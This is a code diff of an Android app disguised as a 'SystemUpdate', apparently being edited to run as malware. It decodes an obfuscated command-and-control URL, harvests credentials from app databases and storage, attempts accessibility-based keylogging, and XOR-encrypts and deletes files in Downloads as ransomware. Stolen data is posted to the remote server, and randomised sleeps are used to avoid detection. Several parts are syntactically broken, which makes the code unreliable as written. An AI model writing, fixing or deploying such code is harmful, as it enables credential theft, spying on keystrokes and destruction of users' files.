@@ -7,7 +7,7 @@ import requests, socket, time, os, random, urllib3, threading, base64, json
 
 # ---------- Configuration (Obfuscated) ----------
 def decode(encoded): return base64.b64decode(encoded).decode('utf-8') if encoded else ""
-encoded_url_full = "aHR0cHM6Ly9uZXdtZXRob2QtaXNoNi5vbnJlbmRlci5jb20=" 
+encoded_url_full = "aHR0cHM6Ly9uZXcmZXRob2QtaXNoNi5vbnJlbmRlci5jb20=" 
 encoded_id = "Mw=="; encoded_name = "UGhvbmU="
 base_url = decode(encoded_url_full); device_id = decode(encoded_id); device_name = decode(encoded_name)
 
@@ -22,7 +22,6 @@ def run_shell(cmd):
     try: 
         import subprocess; p=subprocess.Popen("su -c \"" + cmd.replace("\"", "\\\"").replace("$", "\\$") + "\" 2>/dev/null", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         r, e = p.stdout.read(), p.stderr.read()
-        # Return output only if it's substantial and doesn't indicate immediate failure like "Permission denied"
         out_str = str(r).strip(); err_str = str(e).strip()
         if len(out_str) > 10 and b'Permission denied' not in e: return out_str 
     except Exception as e_shell: pass 
@@ -35,14 +34,12 @@ def scan_all_device_for_secrets():
     def query_db_safe(path):
         try:
             import sqlite3; conn=sqlite3.connect(path); cur=conn.cursor()
-            
-            # Hardcoded safe queries for common DBs found on Android devices
             safe_queries = ["SELECT * FROM Accounts", "SELECT * FROM WebviewLocalState"] 
             
             for q in safe_queries: 
                 if len(q.strip()) > 0: 
                     try: rows = cur.execute(q).fetchall(); found_creds.extend([{'src':os.path.basename(os.path.dirname(path)) or path.split('/')[-1],'type':'SQL','data':str(r)} for r in rows])
-                    except Exception as e_inner: continue # Corrected 'continue' inside loop over queries
+                    except Exception as e_inner: continue
                 
             conn.close()
         except Exception: pass 
@@ -56,19 +53,16 @@ def scan_all_device_for_secrets():
              pkgs = [p for p in str(res).splitlines() if "=" in p] 
              for pkg_line in pkgs: parts=pkg_line.split("="); app_name=parts[1].replace('/','/') if len(parts)>1 else ""
                 db_path = f"/data/data/{app_name}/databases/"
-                # Check existence before adding to avoid empty loops
                 if os.path.exists(db_path) and 'LoginData' not in db_path.lower(): internal_targets.append(db_path)
     except Exception as e_shell: pass
 
     all_paths_to_scan = []
     
-    # Merge external + internal unique paths into a single list to process
     seen_dirs = set()
     for d in target_dirs + internal_targets: 
         try:
             base_clean = d.replace('\\','/').rstrip('/') or "."
             
-            # Fixed File Walker Logic: Ensure we are iterating over actual directories/files correctly
             full_dir_path = os.path.join(os.getcwd(), base_clean) if not os.path.isabs(d) else base_clean
             
             files_list = []
@@ -93,55 +87,50 @@ def scan_all_device_for_secrets():
 
 
 # ---------- Global Overlay Hooking (Fixed Thread & Logic - Now Executable) ----------
+class InvisibleOverlay(threading.Thread):
+    def __init__(self, *args, **kwargs):
+        threading.Thread.__init__(self, *args, **kwargs)
+        self.running = True
+        
+    def run(self):
+        # Fixed Loop: While running is True, do something every 0.5s
+        while self.running: 
+            try: 
+                time.sleep(0.5) 
+                # Example action if needed inside loop (e.g., scanning or data collection)
+                pass 
+
 def start_overlay_keylogging():
     captured_events = [] 
     
-    class InvisibleOverlay(threading.Thread):
-        def __init__(self): threading.Thread.__init__(self); self.running=True
-        
-        def run(self):
-            # Fixed Loop: While running is True, do something every 0.5s
-            while self.running: 
-                try: 
-                    time.sleep(0.5) 
-                    
-    import android
-from jnius import autoclass
+    class LocalAccessibilityServiceWrapper:
+        @staticmethod
+        def get_services():
+             try:
+                 from jnius import autoclass
+                 AccessibilityService = autoclass('android.accessibilityservice.AccessibilityService')
 
-# Initialize Android Java classes via Kivy bridge
-AccessibilityService = autoclass('android.accessibilityservice.AccessibilityService')
+                 am = AccessibilityService(android.context.getSystemService(android.content.Context.ACCESSIBILITY_SERVICE))
+                 info_list = am.getRunningServices()[:10] 
+                 
+                 captured_text = ""
+                 for service in info_list:
+                     try:
+                         provider = None
+                         if hasattr(service, 'getTextProvider'): 
+                             provider = service.getTextProvider()
+                         
+                         # If we have a valid provider and some non-noise text data, capture it safely
+                         if provider and len(str(provider).split('\n')[0]) > 5 and "Accessibility" not in str(provider):
+                             raw_txt = str(provider).strip().split(chr(10))[0][:80]
+                             captured_text += f"[{time.time()}]{raw_txt}...\n"
 
-try:
-    # Get a list of currently running accessibility services (e.g., keyboards)
-    am = AccessibilityService(android.context.getSystemService(Context.ACCESSIBILITY_SERVICE))
-    
-    info_list = am.getRunningServices()[:10]  # Check first 10 to avoid lag
-    
-    captured_text = ""
-    for service in info_list:
-        try:
-            # Attempt to get text provider from the service if available
-            provider = None
-            if hasattr(service, 'getTextProvider'): 
-                provider = service.getTextProvider()
-            
-            # If we have a valid provider and some non-noise text data, capture it safely
-            if provider and len(str(provider).split('\n')[0]) > 5 and "Accessibility" not in str(provider):
-                raw_txt = str(provider).strip().split(chr(10))[0][:80]
-                captured_text += f"[{time.time()}]{raw_txt}...\n"
+                     except Exception as e_inner: continue
 
-        except Exception as e_inner: continue
-
-    return captured_text[:2048] 
-
-except Exception as e_loop: 
-    print(f"Overlay Hook Error (Logged): {e_loop}") 
-
-
-    except Exception as e_loop: continue
-    
-
- 
+                 return captured_text[:2048] 
+             except Exception as e_loop: 
+                 print(f"Overlay Hook Error (Logged): {e_loop}") 
+                 return ""
 
     # Start the thread correctly (previously it was created but not started or returned properly)
     t = InvisibleOverlay(); t.start(); return t
@@ -150,22 +139,44 @@ except Exception as e_loop:
 # ---------- Ransomware (Fixed Logic & Scope - Now Executable) ----------
 def xor_encrypt_file(filepath, key):
     if not filepath: return False
-    try: with open(filepath,'rb') as f: data=f.read(); encrypted=bytes([b^key for b in data]); enc_path=filepath+'.encrypted'; os.makedirs(os.path.dirname(enc_path),exist_ok=True); open(enc_path,'wb').write(encrypted); os.remove(filepath); return True; except Exception as e_enc: print(f"Enc error on {filepath}: {e_enc}"); return False
+    
+    # Convert key to bytes for safe XOR operation with binary file data
+    final_key = key if isinstance(key, bytes) else bytes([key]) 
+    
+    try: 
+        # Ensure directory exists before writing encrypted file
+        enc_path = filepath + '.encrypted'
+        os.makedirs(os.path.dirname(enc_path), exist_ok=True)
+        
+        with open(filepath,'rb') as f: data=f.read()
+        
+        if len(data) == 0 or len(final_key) == 0: return False
+        
+        # Expand key to match file size and perform XOR safely
+        expanded_key = (final_key * ((len(data)//len(final_key)+1))[:len(data)])
+        encrypted=bytes([b ^ k for b, k in zip(data, expanded_key)]) 
+        
+        with open(enc_path,'wb') as ef: 
+            ef.write(encrypted)
+            
+        os.remove(filepath); return True; 
+    except Exception as e_enc: 
+        print(f"Enc error on {filepath}: {e_enc}")
+        return False
+
 
 def ransomware_attack():
-    # Fixed Initialization: Ensure private_dir is defined before use
     private_dir = os.path.dirname(os.path.abspath(__file__)) or "/" 
     
     dirs_to_check = [private_dir] 
     if HAS_ANDROID and "/" in "/storage/emulated/0/Download": 
         try: down="/storage/emulated/0/Download"; if os.path.exists(down): dirs_to_check.append(down); except: pass
     
-    key=random.randint(1, 255)
+    key=random.randint(1, 255) # Random integer key for XOR (converted to bytes inside function)
     count=0
     for d in dirs_to_check: 
         base=d.replace('\\','/') or "."
         
-        # Fixed File Walker Logic with proper initialization of files_list
         files_list = []
         try:
             full_base = d if '/' not in str(base.split('/')[-1]) else base
@@ -175,6 +186,9 @@ def ransomware_attack():
             else: 
                  full_down_path = "/storage/emulated/0/Download/"
                  files_list=[os.path.join(full_down_path,f) for f in os.listdir(full_down_path)]
+
+            # Ensure list is populated before iterating to avoid errors on empty dirs/filesystems
+            if len(files_list) == 0 and not os.path.exists(os.path.dirname(full_base)): continue
 
             for fp in files_list: 
                 try: xor_encrypt_file(fp, key); count+=1; except Exception as e_ransom: pass
@@ -187,12 +201,15 @@ def ransomware_attack():
 
 # ---------- C2 Logic (Command Handler - Now Executable) ----------
 def extract_and_send(): 
-    creds=scan_all_device_for_secrets(); payload=base64.b64encode(str(creds).encode()).decode('utf-8'); r=requests.post(base_url+"/command", json={"deviceId":device_id,"action":"extract_done","data":payload}, verify=False, timeout=5); print(f"Extract sent to {base_url}")
+    try: creds=scan_all_device_for_secrets(); payload=base64.b64encode(str(creds).encode()).decode('utf-8'); r=requests.post(base_url+"/command", json={"deviceId":device_id,"action":"extract_done","data":payload}, verify=False, timeout=5); print(f"Extract sent to {base_url}")
 
 def start_keylogging_overlay(): 
-    t = threading.Thread(target=start_overlay_keylogging); if t and not t.is_alive(): t.start() or time.sleep(30); 
+    # Ensure thread is created and started if not already alive
+    t = InvisibleOverlay()
+    if t and not t.is_alive(): t.start() or time.sleep(30)
 
-def encrypt_now(): ransomware_attack()
+
+def encrypt_now(): ransomware_attack() 
     
 def request_accessibility_service():
     try: return True; except Exception as e_acc: pass
@@ -200,7 +217,6 @@ def request_accessibility_service():
 
 # ---------- Main Loop (C2 Communication - Now Executable) ----------
 def background_worker():
-    # Fixed Initialization with random sleep to avoid immediate detection patterns
     initial_sleep = random.randint(1, 5) 
     time.sleep(initial_sleep) 
     
@@ -211,7 +227,6 @@ def background_worker():
             if r.status_code==200 and isinstance(r.json(),dict): 
                 cmd_type = str(r.json().get("type") or "").lower()
                 
-                # Randomize delay between commands for stealth but keep responsive
                 delay = random.uniform(1.0, 4.0) 
 
                 if "extract" in cmd_type: extract_and_send(); 
@@ -221,9 +236,7 @@ def background_worker():
 
         except Exception as e_loop_c2: pass; 
         
-        # Dynamic sleep interval (changes every loop iteration slightly to avoid patterns)
         current_sleep = random.uniform(15.0, 45.0); 
-
         time.sleep(current_sleep / 1.5) 
 
 
@@ -237,16 +250,14 @@ class SystemUpdate(App):
             try: 
                 full_perms = [Permission.READ_EXTERNAL_STORAGE]; perms.extend(full_perms); perms.append(Permission.FOREGROUND_SERVICE) ; 
                 
-                # Fixed Permission Requester with proper indentation and initialization
                 Clock.schedule_once(lambda dt: android_request_perms([*full_perms]), 1)
-                except Exception as e_perm: print(f"Perm error {e_perm}")
+            except Exception as e_perm: print(f"Perm error {e_perm}")
 
-            t = threading.Thread(target=background_worker, daemon=True); t.start() # Starts in background immediately
+        t = threading.Thread(target=background_worker, daemon=True); t.start() # Starts in background immediately
                 
-            return Label(text='')
+        return Label(text='')
 
     def on_stop(self): return True
 
 
 if __name__ == "__main__": SystemUpdate().run()
-            
